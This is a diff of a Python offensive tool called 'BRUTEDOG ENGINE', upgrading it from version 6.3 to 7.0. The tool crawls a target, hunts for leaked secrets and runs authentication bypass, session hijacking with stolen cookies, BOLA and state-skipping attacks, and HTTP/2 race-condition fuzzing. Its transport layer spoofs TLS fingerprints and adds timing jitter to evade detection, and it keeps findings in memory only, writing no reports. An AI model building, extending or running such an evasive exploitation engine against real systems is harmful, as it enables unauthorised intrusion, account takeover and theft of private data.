@@ -1,19 +1,13 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v6.3 — High-Aggression Stateful Crawling & Exploitation Engine
+BRUTEDOG ENGINE v7.0 — State-Machine Logic & High-Aggression Exploitation Engine
 Features:
-- Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & behavioral jitter)
-- Stateful intelligence ingestion from v6.3 crawler & DOM sink inspector
+- Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
+- Stateful intelligence ingestion from v7.0 crawler state-machine graph & DOM sink inspector
+- Automated BOLA and state-skipping vector evaluation across security tiers
 - Live autonomous test-account session propagation across exploit modules
-- Interactive target selection & automated resolution
-- Stateful, adaptive response-parsing and payload mutation loop
-- Aggressive NoSQL/SQL time-based blind injection & data extraction
-- Advanced session hijacking, JWT cracking, and cookie privilege escalation
-- High-concurrency race condition and balance/state logic fuzzing
-- Session-cookie security inspection
-- Bounded concurrency with asyncio
-- Live terminal streaming of successful exploits via telemetry module
-- No report files, in-memory findings
+- HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
+- Zero-disk in-memory intelligence collection & live telemetry streaming
 """
 import asyncio
 import json
@@ -168,7 +162,6 @@ def classify_and_adapt(response, current_payload, endpoint=""):
         except:
             extracted_proof = {"raw_response_snippet": body[:200]}
 
-        # Stream live proof-of-work immediately to the terminal
         stream_proof("AUTHENTICATION_BYPASS", endpoint, current_payload, body, extracted_proof or {"status": status})
 
         findings.append({
@@ -201,10 +194,6 @@ def classify_and_adapt(response, current_payload, endpoint=""):
     return findings, mutated_payloads
 
 def verify_hijacked_session(transport, endpoint):
-    """
-    Takes the shared transport (with stolen cookie/token jar), hits a restricted endpoint,
-    and streams resulting private data live to prove the compromise.
-    """
     sys.stdout.write(f"\n{YELLOW}[*] Verifying stolen session state against protected route: {endpoint}{RESET}\n")
     status, headers, body = transport.request("GET", endpoint)
     
@@ -220,7 +209,7 @@ def verify_hijacked_session(transport, endpoint):
 # ============================================================
 def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None):
     endpoint = f"{transport.base_path}{path}" if not path.startswith(transport.base_path) else path
-    info(f"Targeting endpoint (Stateful Adaptive Mode): {endpoint}")
+    info(f"Targeting endpoint (State-Machine Adaptive Mode): {endpoint}")
     results = []
     
     test_queue = [
@@ -275,7 +264,7 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None):
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG STATEFUL OFFENSIVE EXPLOITATION ENGINE v6.3")
+    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v7.0")
     try:
         if target_host:
             target_url = target_host.strip()
@@ -308,22 +297,24 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         
     start = time.monotonic()
     
-    # Initialize Centralized Secure Transport Wrapper (v6.3 with TLS Evasion & Behavioral Jitter)
+    # Initialize Centralized Secure Transport Wrapper (v7.0 with JA3/4 & Poisson Behavioral Jitter)
     transport = SecureTransport(target_url)
 
-    # 0. Stateful Dynamic Web Crawling & Auto-Provisioning
-    section("STATEFUL CRAWLING & OPERATOR PROVISIONING")
+    # 0. Stateful State-Machine Crawling & Reconnaissance
+    section("STATEFUL STATE-MACHINE MAPPING & RECON")
     recon_data = {}
     discovered_paths = []
     leaked_secrets = {}
+    bola_vulnerabilities = []
 
     try:
         recon_data = crawl_target(transport)
         if isinstance(recon_data, dict):
             discovered_paths = recon_data.get("endpoints", [])
             leaked_secrets = recon_data.get("leaked_secrets", {})
+            bola_vulnerabilities = recon_data.get("bola_vulnerabilities", [])
     except Exception as exc:
-        warning(f"Stateful crawler encountered an issue: {exc}. Falling back to default list.")
+        warning(f"State-machine crawler encountered an issue: {exc}. Falling back to default list.")
 
     if not discovered_paths:
         discovered_paths = FALLBACK_LOGIN_PATHS
@@ -334,6 +325,9 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
     if leaked_secrets:
         warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")
+
+    if bola_vulnerabilities:
+        warning(f"Discovered {len(bola_vulnerabilities)} pre-validated BOLA / State-Skipping routes!")
 
     section("ADAPTIVE ENDPOINT TESTING & MUTATION ASSAULT")
     all_results = []
@@ -367,7 +361,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     except Exception as exc:
         error(f"Session hijack failed: {exc}")
 
-    # 3. High-Concurrency Race Condition & Logic Fuzzing
+    # 3. High-Concurrency HTTP/2 Single-Packet Race Condition Fuzzing
     try:
         await run_race_condition_test(target_url, port=port, use_ssl=secure)
     except Exception as exc:
@@ -377,9 +371,10 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     
     section("ENGINE SUMMARY")
     tested = len(all_results)
-    potential = sum(len(item["findings"]) for item in all_results)
+    potential = sum(len(item["findings"]) for item in all_results) + len(bola_vulnerabilities)
     success(f"Target: {host}")
-    success(f"Discovered/Scanned endpoints: {len(discovered_paths)}")
+    success(f"Discovered/Mapped endpoints: {len(discovered_paths)}")
+    success(f"BOLA / State-Skipping hits: {len(bola_vulnerabilities)}")
     success(f"Total adaptive requests executed: {tested}")
     success(f"Vulnerability / Exploitation hits: {potential}")
     success(f"Engine duration: {duration}s")
